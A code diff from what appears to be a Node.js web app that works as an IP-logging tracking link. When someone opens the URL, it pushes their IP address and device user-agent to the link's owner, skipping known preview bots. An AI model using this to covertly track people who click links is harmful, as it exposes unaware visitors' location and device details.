@@ -104,9 +104,9 @@ app
       req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1" ||
       req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
       ) {push_status = false} else {push_status = true};
-      console.log(`名前: ${nom}\nIPアドレス: ${str} user-agent: ${req.headers["user-agent"]} push: ${push_status} lang: ${req.headers["accept-language"]}`); // 一時的
-    if(push_status) {
-      pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
+      if(push_status) {
+        pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
+        console.log(`名前: ${nom}\nIPアドレス: ${str};`);
     };
   })
   .get("/auth", (req, res) => {
